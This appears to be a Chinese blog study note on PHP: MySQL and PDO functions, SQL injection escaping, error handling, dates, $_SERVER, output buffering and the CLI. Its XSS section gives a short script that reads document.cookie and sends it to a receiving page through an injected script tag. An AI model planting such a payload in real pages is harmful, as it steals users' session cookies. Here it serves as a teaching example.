---
layout: default
title: php入门学习(6)
---

## MySQL函数 ##

```
mysql_client_encoding([$link])  //返回字符集的名称  
mysql_set_charset($charset [,$link])    //设置客户端字符集编码  
mysql_connect($host, $user, $pass)  //打开一个到MySQL服务器的连接  
mysql_create_db($db [,$link])   //新建一个MySQL数据库  
mysql_pconnect($host, $user, $pass) //打开一个到MySQL服务器的持久连接  
mysql_ping([$link]) //Ping一个服务器连接，如果没有连接则重新连接  
mysql_close([$link])    //关闭MySQL连接  
  
mysql_data_seek($result, $row)  //移动内部结果的指针  
mysql_errno([$link])    //返回上一个MySQL操作中的错误信息的数字编码  
mysql_error([$link])    //返回上一个MySQL操作产生的文本错误信息  
mysql_affected_rows([$link])  //取得前一次MySQL操作所影响的记录行数  
mysql_info([$link]) //取得最近一条查询的信息  
mysql_insert_id([$link])    //取得上一步INSERT操作产生的ID  
  
mysql_query($sql [,$link])  //发送一条MySQL查询  
mysql_unbuffered_query($sql [,$link])   //向MySQL发送一条SQL查询，并不获取和缓存结果的行  
mysql_db_query($db, $sql [,$link])  //发送一条MySQL查询  
  
mysql_escape_string($str)   //转义一个字符串用于mysql_query  
mysql_real_escape_string($str)  //转义SQL语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集  
  
mysql_fetch_array($result [,$type]) //从结果集中取得一行作为关联数组，或数字数组，或二者兼有  
mysql_fetch_assoc($result)  //从结果集中取得一行作为关联数组  
mysql_fetch_object($result) //从结果集中取得一行作为对象  
mysql_fetch_row($result)    //从结果集中取得一行作为枚举数组  
mysql_fetch_field($result)  //从结果集中取得列信息并作为对象返回  
mysql_num_fields($result)   //取得结果集中字段的数目  
mysql_num_rows($result) //取得结果集中行的数目  
  
mysql_fetch_lengths($result)    //取得结果集中每个输出的长度  
mysql_field_flags($result, $field_offset)    //从结果中取得和指定字段关联的标志  
mysql_field_len($result, $field_offset)    //返回指定字段的长度  
mysql_field_name($result, $field_offset)    //取得结果中指定字段的字段名  
mysql_field_seek($result, $field_offset)    //将结果集中的指针设定为制定的字段偏移量  
mysql_field_table($result, $field_offset)   //取得指定字段所在的表名  
mysql_field_type($result, $field_offset)    //取得结果集中指定字段的类型  
mysql_free_result($result)  //释放结果内存  
  
mysql_list_dbs([$link]) //列出MySQL服务器中所有的数据库  
mysql_list_fields($db, $table [,$link]) //列出MySQL结果中的字段  
mysql_list_processes([$link])   //列出MySQL进程  
mysql_list_tables($db [,$link]) //列出MySQL数据库中的表  
  
mysql_result($result, $row [$field])    //取得结果数据  
mysql_select_db($db [,$link])   //选择MySQL数据库  
mysql_tablename($result, $i)    //取得表名  
mysql_db_name($result, $row [,$field])  //取得mysql_list_dbs()调用所返回的数据库名  
  
mysql_stat([$link]) //取得当前系统状态  
mysql_thread_id([$link])    //返回当前线程的ID  
mysql_get_client_info() //取得MySQL客户端信息  
mysql_get_host_info()   //取得MySQL主机信息  
mysql_get_proto_info()  //取得MySQL协议信息  
mysql_get_server_info() //取得MySQL服务器信息  
``` 

## SQL注入 ##

特殊字符导致的问题：  
    1. 转义：mysql_real_escape_string()  
        对外来数据(GPC: GET, POST, COOKIE)进行转义  
    2. 先查询当前记录行，再匹配用户名  
  
### 魔术引号机制 ###
  
自动为所有提交到服务器的数据增加特殊符号的转义。  
当打开时，所有的单引号，双引号，反斜线和NULL字符都会被自动加上一个反斜线进行转义。这和addslashes()作用完全相同。
```  
php.ini配置：  
    magic_quotes_gpc = Off  
get_magic_quotes_gpc()  获取当前魔术引号机制的配置信息
```  

## 错误处理 ##

解析错误、运行错误 
 
### 标准错误 ###  
    级别、信息、文件、行号  
    trigger_error   触发一个用户自定义的error/warning/notice错误信息  
  
### php.ini配置，ini_set() ###
 
error_reporting         设置报告哪些级别的错误  
1. 错误报告：显示到页面  
    display_errors = On 是否显示错误报告  
2. 错误日志：存放到文件  
    log_errors = on     是否开启错误日志  
    error_log           发送错误信息到错误日志文件  
- 错误报告和错误日志可同时启用！  
  
自定义错误处理器  
set_error_handler — 注册自定义错误处理器函数  
- 自定义处理器函数包含4个参数，分别是级别、信息、文件、行号  
- 开启自定义错误处理器，则系统内置的错误报告和错误日志则不会执行。  
- 自定义错误处理器函数返回false，则自定义函数结束后系统内置的会继续执行。  
- 用户定义的错误级别(E_USER_ERROR)，可以被自定义的错误处理器所捕获并继续执行。系统内置的错误，则脚本会立即停止。  
restore_error_handler — 恢复预定义错误处理器函数  
error_get_last — 获取最近的错误信息  
  
### 错误处理函数 ###
 
debug_backtrace 产生一条回溯跟踪  
    返回数组，包含的键值：function, line, file, class, object, type, args  
debug_print_backtrace 打印一条回溯  
  
### 错误常量 ### 

手册>错误处理  
  
1. 生产模式  
关闭错误报告，记录错误日志。  
2.开发模式  
关闭错误日志，开启错误报告。  
  
### 异常 ###
 
面向对象语法中的错误处理方式。  
一个异常就是一个包含当前异常信息的对象。  
预定义异常类Exception及其扩展类。  
1. 抛出异常  
触发一个异常的错误  
throw new UserException();  
如果没有被捕获，则报告致命错误。  
2. 监视异常  
try {代码段}  
3. 捕获异常  
catch (UserException $obj) {代码段}  
需要通过当前异常的类型匹配才可悲捕获。  
4. 异常处理器  
用以处理未被捕获的异常。  
异常处理器函数与catch类似，参数也是含类型的对象。  
set_exception_handler — 注册异常处理器函数  
restore_exception_handler — 恢复预定义的异常处理器函数  
  
  
5. 自定义异常  
用户定义的异常类须继承自Exception类。  
  
### 异常相关属性 ###
 
protected string $message 异常消息内容  
protected int $code 异常代码  
protected string $file 抛出异常的文件名  
protected int $line 抛出异常在该文件中的行号  

### 异常相关方法 ### 
```
Exception::__construct — 异常构造函数  
Exception::getMessage — 获取异常消息内容  
Exception::getPrevious — 返回异常链中的前一个异常  
Exception::getCode — 获取异常代码  
Exception::getFile — 获取发生异常的程序文件名称  
Exception::getLine — 获取发生异常的代码在文件中的行号  
Exception::getTrace — 获取异常追踪信息  
Exception::getTraceAsString — 获取字符串类型的异常追踪信息  
Exception::__toString — 将异常对象转换为字符串  
Exception::__clone — 异常克隆 
``` 

## 数据库抽象层 ## 

PDO:PHP Data Objects  
PHO抽象层默认被加载，但需加载相应数据库的驱动。  
PDO是OOP语法，提供三个类：  
PDO：PDO自身  
PDOStatement：PDO语句类，提供对语句的后续处理  
PDOException：PDO异常类，提供对错误的异常处理  
  
### 连接数据库 ###
  
PDO::__construct(str $dsn [,str $username [,str $password [,arr $driver_options]]])  
DSN：Data Source Name，数据源  
$dsn = 'mysql:dbname=testdb;host=127.0.0.1;port=3306'; 
 
### 执行没有返回结果的SQL语句 ###
 
int PDO::exec(str $statement)   //返回影响的记录数
  
### 执行有返回结果集的SQL语句  ###
PDOStatement PDO::query (string $statement) //返回PDOStatement对象
  
### 处理结果集(PDOStatement对象) ###
``` 
array PDOStatement::fetchAll([int $fetch_style [,mixed $fetch_argument [,array $ctor_args = array()]]])    //默认返回关联+索引数组  
mixed PDOStatement::fetch ([ int $fetch_style [, int $cursor_orientation = PDO::FETCH_ORI_NEXT [, int $cursor_offset = 0 ]]] )  //返回一行  
string PDOStatement::fetchColumn ([ int $column_number = 0 ] )  //返回一列  
```

### 释放资源 ### 
unset($pdo) 或 $pdo = null  
  
### 错误报告 ###
 
静默模式：silent mode，出现错误，不主动报告错误（默认）  
array PDO::errorInfo(void)  
警告模式：warning mode，出现错误，触发一个警告级别的错误  
异常错误：exception mode，出现错误，抛出异常  
bool PDO::setAttribute(int $attribute, mixed $value)    //设置PDO类属性值  
PDO::setAttribute('PDO::ATTR_ERRMODE', 'PDO::ERRMODE_SILENT | PDO::ERRMODE_WARNING | PDO::ERRMODE_EXCEPTION')  
  
### 预处理式执行SQL ###
 
可对数据自动转义，可有效抵制SQL注入。
```  
PDOStatement PDO::prepare(string $statement [,array $driver_options=array()])  
bool PDOStatement::bindParam ( mixed $parameter , mixed &$variable [, int $data_type = PDO::PARAM_STR [, int $length [, mixed $driver_options ]]] )  
bool PDOStatement::execute ([ array $input_parameters ] )  
```

## AR模式 ##

表  ->  类  
字段 ->  类属性  
数据 ->  对象  

## Date/Time ##

* date($format [,$timestamp]) //格式化一个本地时间／日期，$timestamp默认为time()
```  
    Y：4位数字完整表示的年份  
    m：数字表示的月份，有前导零  
    d：月份中的第几天，有前导零的2位数字  
    j：月份中的第几天，没有前导零  
    H：小时，24小时格式，有前导零  
    h：小时，12小时格式，有前导零  
    i：有前导零的分钟数  
    s：秒数，有前导零  
    L：是否为闰年，如果是闰年为1，否则为0  
    M：三个字母缩写表示的月份，Jan到Dec  
    W：年份中的第几周，每周从星期一开始  
    z：年份中的第几天  
    N：数字表示的星期中的第几天  
    w：星期中的第几天，数字表示  
    e：时区标识  
    T：本机所在的时区  
    U：从Unix纪元开始至今的秒数(时间戳)
```  
* time() //返回当前的Unix时间戳(秒)  
* microtime([$get_as_float]) //返回当前Unix时间戳和微秒数
```  
    $get_as_float参数存在并且其值等价于TRUE，将返回一个浮点数 \
``` 
* strtotime($time [,$now]) //将任何英文文本的日期时间描述解析为Unix时间戳 
``` 
    date("Y-m-d H:i:s", strtotime("-1 day")); //格式化前一天的时间戳  
    "now"  
    "10 September 2000"  
    "+1 week"  
    "+1 week -2 days 4 hours 2 seconds"  
    "last Monday"  
    "next Thursday"  
```
* gmdate($format [,$timestamp]) //格式化一个GMT/UTC 日期／时间  
* mktime([$hour = date("H") [,$minute = date("i") [,$second = date("s") [,$month = date("n") [,$day = date("j") [,$year = date("Y") [,$is_dst = -1]]]]]]]) //取得一个日期的Unix时间戳  
* strftime($format [,$timestamp]) //根据区域设置格式化本地时间／日期  
* date_default_timezone_get($timezone) //获取默认时区  
* date_default_timezone_set($timezone) //设置默认时区  

## DateTime ##

date()函数能处理有效时间戳范围是格林威治时间 1901 年 12 月 13 日 20:45:54 到 2038 年 1 月 19 日 03:14:07(因为32位系统能最大正整数限制)
```  
DateTime::__construct([$time="now"]) //构造方法  
    $time若是时间戳，则在时间戳前加@符号，如'@2345678'  
DateTime::setTimezone($timezone) //设置时区  
    eg: $date->setTimezone(new DateTimeZone('PRC'));  
DateTime::format($format) //格式化时间戳，格式化字符串形式同date()函数
```
  
## $_SERVER ## 
示例URL：http://desktop/dir/demo.php?a=aaa&b=bbb  
* PHP_SELF 当前执行脚本的文件名 // /dir/demo.php  
* GATEWAY_INTERFACE 服务器使用的CGI规范的版本 // CGI/1.1  
* SERVER_ADDR 当前运行脚本所在的服务器的IP地址 // 127.0.0.1  
* SERVER_NAME 当前运行脚本所在的服务器的主机名 // desktop  
* SERVER_SOFTWARE 服务器标识字符串 // Apache/2.2.22 (Win32) PHP/5.3.13  
* SERVER_PROTOCOL 请求页面时通信协议的名称和版本 // HTTP/1.1  
* REQUEST_METHOD 访问页面使用的请求方式 // GET  
* REQUEST_TIME 请求开始时的时间戳 // 1386032633  
* QUERY_STRING 查询字符串(参数) // a=aaa&b=bbb  
* DOCUMENT_ROOT 当前运行脚本所在的文档根目录 // C:/Users/Administrator/Desktop  
* HTTP_ACCEPT 当前请求头中Accept:项的内容 // text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
* HTTP_ACCEPT_CHARSET 当前请求头中Accept-Charset:项的内容 // UTF-8,*  
* HTTP_ACCEPT_ENCODING 当前请求头中Accept-Encoding:项的内容 // gzip, deflate  
* HTTP_ACCEPT_LANGUAGE 当前请求头中Accept-Language:项的内容 // zh-cn,zh;q=0.5  
* HTTP_CONNECTION 当前请求头中Connection:项的内容 // keep-alive  
* HTTP_HOST 当前请求头中Host:项的内容 // desktop  
* HTTP_REFERER 引导用户代理到当前页的前一页的地址  
* HTTP_USER_AGENT 当前请求头中User-Agent:项的内容 // Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1  
		HTTPS 如果脚本是通过HTTPS协议被访问，则被设为一个非空的值  
* REMOTE_ADDR 浏览当前页面的用户的IP地址 // 127.0.0.1  
		REMOTE_HOST 浏览当前页面的用户的主机名  
* REMOTE_PORT 用户机器上连接到Web服务器所使用的端口号 // 49197  
		REMOTE_USER 经验证的用户  
		REDIRECT_REMOTE_USER 验证的用户，如果请求已在内部重定向  
* SCRIPT_FILENAME 当前执行脚本的绝对路径 // C:/Users/Administrator/Desktop/dir/demo.php  
* SERVER_ADMIN 该值指明了Apache服务器配置文件中的SERVER_ADMIN参数 //admin@shocker.com  
* SERVER_PORT Web服务器使用的端口 // 80  
		SERVER_SIGNATURE 包含了服务器版本和虚拟主机名的字符串  
		PATH_TRANSLATED 当前脚本所在文件系统（非文档根目录）的基本路径  
* SCRIPT_NAME 当前脚本的路径 // /dir/demo.php  
* REQUEST_URI URI用来指定要访问的页面 // /dir/demo.php?a=aaa&b=bbb  
		PHP_AUTH_DIGEST 客户端发送的“Authorization” HTTP头内容  
		PHP_AUTH_PW 用户输入的密码  
		AUTH_TYPE 认证的类型  
		PATH_INFO 包含由客户端提供的、跟在真实脚本名称之后并且在查询语句（query string）之前的路径信息  
		ORIG_PATH_INFO 在被PHP处理之前，“PATH_INFO”的原始版本  

## 缓存 ##

1. ob缓存(输出缓存)(需开启)  
    	php.ini设置中开启并设置输出缓存大小：output_buffering = 4096  
    	ob_start()  开启当前脚本页面的输出缓存  
    	如果输出缓存打开，则输出的数据先放到输出缓存(header函数前可以有输出)，否则直接放入程序缓存。  
    	header()函数发送的内容直接放入程序缓存。  
    	开启输出缓存后，输出缓存数据会刷新到程序缓存，然后有Apache封装成http响应包返回给浏览器。  
    	输出缓存：存放的数据是从开启输出缓存开始返回给浏览器的所有静态页面数据！  
2. 程序缓存(内部缓存，必须存在，不能关闭)  
3. 浏览器缓存  

## ob缓存(输出控制) ##

ob_start()  //打开一个输出缓冲区，所有的输出信息不再直接发送到浏览器，而是保存在输出缓冲区里面。  
    * ob_start('ob_gzhandler'); //将gz编码的数据发送到支持压缩页面的浏览器  
ob_clean();            //删除内部缓冲区的内容，不关闭缓冲区(不输出)。  
ob_end_clean();        //删除内部缓冲区的内容，关闭缓冲区(不输出)。  
ob_get_clean();        //返回内部缓冲区的内容，关闭缓冲区。相当于执行ob_get_contents()与ob_end_clean()  
ob_flush();            //发送内部缓冲区的内容到浏览器，删除缓冲区的内容，不关闭缓冲区。  
ob_end_flush();        //发送内部缓冲区的内容到浏览器，删除缓冲区的内容，关闭缓冲区。  
ob_get_flush();        //返回内部缓冲区的内容，并关闭缓冲区，再释放缓冲区的内容。相当于ob_end_flush()并返回缓冲区内容。  
flush();               //将当前为止程序的所有输出发送到用户的浏览器  
  
ob_get_contents();     //返回缓冲区的内容，不输出。  
ob_get_length();       //返回内部缓冲区的长度，如果缓冲区未被激活，该函数返回FALSE。  
ob_get_level();        //Return the nesting level of the output buffering mechanism.  
ob_get_status();       //获取ob状态信息  
  
ob_implicit_flush();   //打开或关闭绝对刷新，默认为关闭，打开后ob_implicit_flush(true)，所谓绝对刷新，即当有输出语句(e.g: echo)被执行时，便把输出直接发送到浏览器，而不再需要调用flush()或等到脚本结束时才输出。  
  
ob_gzhandler               //ob_start回调函数，用gzip压缩缓冲区的内容。  
ob_list_handlers           //List all output handlers in use  
output_add_rewrite_var     //Add URL rewriter values  
output_reset_rewrite_vars  //Reset URL rewriter values  
  
这些函数的行为受php_ini设置的影响：  
output_buffering       //该值为ON时，将在所有脚本中使用输出控制；若该值为一个数字，则代表缓冲区的最大字节限制，当缓存内容达到该上限时将会自动向浏览器输出当前的缓冲区里的内容。  
output_handler         //该选项可将脚本所有的输出，重定向到一个函数。
		* 例如，output_handler 设置为 mb_output_handler() 时，字符的编码将被修改为		指定的编码。设置的任何处理函数，将自动的处理输出缓冲。  
implicit_flush   //作用同ob_implicit_flush，默认为Off。  
  
### ob缓存作用 ### 
1. 防止在浏览器有输出之后再使用setcookie()、header()或session_start()等发送头文件的函数造成的错误。其实这样的用法少用为好，养成良好的代码习惯。  
2. 捕捉对一些不可获取的函数的输出，比如phpinfo()会输出一大堆的HTML，但是我们无法用一个变量例如$info=phpinfo();来捕捉，这时候ob就管用了。  
3. 对输出的内容进行处理，例如进行gzip压缩，例如进行简繁转换，例如进行一些字符串替换。  
4. 生成静态文件，其实就是捕捉整页的输出，然后存成文件。经常在生成HTML，或者整页缓存中使用。  



## 静态化 ##

1. 页面URL长度不超过255字节  
2. meta信息尽量完整，keywords5个左右  
3. 前端不要使用框架  
4. 图片alt属性添加信息  
5. 静态页面不要带动态值  
```  
<script type="text/javascript" language="javascript" src="url"></script> 
url可以是js/php/图片等，返回的数据替换<script>标签所在位置的内容！相当于简单的Ajax
```   

## Apache压缩 ##

gzip/deflate 
 
## XSS攻击 ##

* 恶意JS代码  
* 不规则HTML代码  
  
开源过滤器：htmlpurifier  
  
### 获取COOKIE ###
``` 
<script>  
var c = document.cookie; //获取COOKIE  
var script = document.createElement('script'); //创建script标签  
script.src = 'demo.php?c=' + c; //发送到指定的文件接收  
document.body.appendChild(script); //添加到DOM对象中生效  
</script> 
``` 

## 命令行CLI ##

1. 显示帮助信息  
php -h  
2. 解析并运行-f选项给定的文件名 
``` 
php [-f] <file> [--] [args...] 
``` 
3. 在命令行内运行单行PHP代码  
```
php [options] -r <code> [--] [args...] 
``` 
无需加上PHP的起始和结束标识符，否则将会导致语法解析错误  
4. 调用phpinfo()函数并显示出结果
```  
php -i/--info  
```
5. 检查PHP语法  
```
php -l/--syntax-check  
```
6. 打印出内置以及已加载的PHP及Zend模块  
```
php -m/--modules  
```
7. 将PHP，PHP SAPI和Zend的版本信息写入标准输出  
```
php -v/--version  
```
  
8. 参数接收  
		$argv    传递给脚本的参数数组  
    	第一个参数总是当前脚本的文件名，因此$argv[0]就是脚本文件名  
		$argc    传递给脚本的参数数目  
    	脚本的文件名总是作为参数传递给当前脚本，因此$argc的最小值为1  
包含当运行于命令行下时传递给当前脚本的参数的数组  
此两个变量仅在register_argc_argv打开时可用  
  
  
## 设计模式 ##  

* 单例模式：为一个类生成一个唯一的对象。使用单例模式生成一个对象后，该对象可以被其它众多对象所使用。  
* 工厂模式：封装对象的建立过程。可以在对象本身创建对象工厂或者是一个额外的工厂类  
* MVC模式：用户->控制器->模型->控制器->视图->控制器->用户  

## 配置选项 ##

set_time_limit($seconds) //设置脚本最大执行时间(默认30秒)，0表示不限制  
ini_get($varname) //获取一个配置选项的值  
ini_set($varname, $newvalue) //为一个配置选项设置值  
extension_loaded($ext_name) //检测一个扩展是否已经加载  
get_extension_funcs($ext_name) //返回模块函数名的数组  

## 其他 ##

* version_compare(str $ver1, str $ver2 [,str $operator])  //比较版本号  
    	$operator表示操作符，可选：<, lt, <=, le, >, gt, >=, ge, ==, =, eq, !=, <>, ne  
    	如果省略$operator，返回两个版本号的差值。  
* 符号@    用于抑制系统运行错误的报告显示  
* memory_get_usage    //获取当期内存使用情况  
* memory_get_peak_usage   //获取内存使用的峰值  
* getrusage   //获取CPU使用情况(Windows不可用)  
* uniqid([$prefix])   //获取一个带前缀、基于当前时间微秒数的唯一ID  
* highlight_string($str [,$return])   //字符串的语法高亮  
    	$return：设置为TRUE，高亮后的代码不会被打印输出，而是以字符串的形式返回。高亮成功返回TRUE，否则返回FALSE。  
* highlight_file($file [,$return])    //语法高亮一个文件  
* __halt_compiler     //中断编译器的执行  
* get_browser     //获取浏览器具有的功能  
    	get_browser ([ string $user_agent [, bool $return_array = false ]] )  
    	如果设置为 TRUE，该函数会返回一个 array，而不是 object  
* eval($code) //把字符串作为PHP代码执行  
* gzcompress($str [,$level=-1])   //压缩字符串  
* gzuncompress($str)  //解压缩字符串  
* gzencode($str [,$level=-1])   //压缩字符串  
* gzdecode($str)  //解压缩字符串  
* ignore_user_abort($bool) //设置客户端断开连接时是否中断脚本的执行  
 

<center><strong>{{ page.date | date_to_string }}</strong></center>
